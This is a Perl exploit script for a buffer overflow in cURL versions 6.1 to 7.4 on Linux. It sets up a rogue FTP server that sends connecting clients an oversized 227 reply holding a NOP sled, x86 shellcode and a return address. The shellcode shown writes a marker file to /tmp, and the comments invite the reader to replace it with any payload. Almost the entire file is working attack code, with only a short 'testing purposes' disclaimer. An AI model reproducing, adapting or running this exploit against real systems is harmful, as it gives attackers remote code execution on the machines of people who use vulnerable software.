#!/usr/bin/perl
#
# Remote linux cURL exploit for versions 6.1 - 7.4
#
# Written by zillion (at http://safemode.org && http://www.snosoft.com)
# 
# This exploit, which has been tested to work with cURL 6.4, 7.2 and 7.3,  
# may only be used for testing purposes. Additionally, the author does not 
# take any resposibilities for abuse of this file. More information about  
# the used vulnerability can be found on securityfocus:
#
# http://online.securityfocus.com/bid/1804
#
# The shellcode will write "Owned by a cURL ;)" to the file /tmp/0wned.txt
# You can replace it with whatever you want but be warned: due to buffer 
# manipilation working shellcode might be altered.
#
# A FreeBSD version is also available on safemode.org

use IO::Socket;
use Net::hostent;

$shellcode = # does a open() write() close() and exit(). 
        "\xeb\x40\x5e\x31\xc0\x88\x46\x0e\xc6\x46\x21\x09\xfe\x46\x21".
        "\x88\x46\x22\x8d\x5e\x0f\x89\x5e\x23\xb0\x05\x8d\x1e\x66\xb9".
        "\x42\x04\x66\xba\xe4\x01\xcd\x80\x89\xc3\xb0\x04\x8b\x4e\x23".
        "\x66\xba\x0f\x27\x66\x81\xea\xfc\x26\xcd\x80\xb0\x06\xcd\x80".
        "\xb0\x01\x31\xdb\xcd\x80\xe8\xbb\xff\xff\xff\x2f\x74\x6d\x70".
        "\x2f\x30\x77\x6e\x65\x64\x2e\x74\x78\x74\x23\x30\x77\x6e\x65".
        "\x64\x20\x62\x79\x20\x61\x20\x63\x55\x52\x4c\x20\x3b\x29";

while($_ = $ARGV[0], /^-/) {
    shift;       
    last if /^--$/;
    /^-p/ && do { $port = shift; };
    /^-l/ && do { $list = 1; };
    /^-o/ && do { $offset = shift; };
}


$id     = `id -u`; chop($id);
$size   =  249;
$esp    =  0xbffff810;
$offset =  -150 unless $offset;
$port   =  21 unless $port;

if(!$list || $port > 1024 && $id != 0) {

print <<"TWENTE";

   Usage :  $0 -l 
   Option:  $0 -p <port to listen on>
   Option:  $0 -o <offset>

   Note: low ports require root privileges

TWENTE
exit;

}

for ($i = 0; $i < ($size - length($shellcode)) - 4; $i++) {
    $buffer .= "\x90";
}

$buffer .= "$shellcode";
$buffer .= pack('l', ($esp + $offset)); 

print("Listening on port $port. We are using return address: 0x", sprintf('%lx',($esp - $offset)), "\n");

my $sock = new IO::Socket::INET (
                                 LocalPort => $port,
                                 Proto => 'tcp',
                                 Listen => 1,
                                 Reuse => 1,
                                );
die "Could not create socket: $!\n" unless $sock;

while($cl = $sock->accept()) {

   $hostinfo = gethostbyaddr($cl->peeraddr);
   printf "[Received connect from %s]\n", $hostinfo->name || $cl->peerhost;
   print $cl "220 Safemode.org FTP server (Version 666) ready.\n";
   print $cl "230 Ok\n";
   print $cl "227 $buffer\n";
   sleep 2;

}
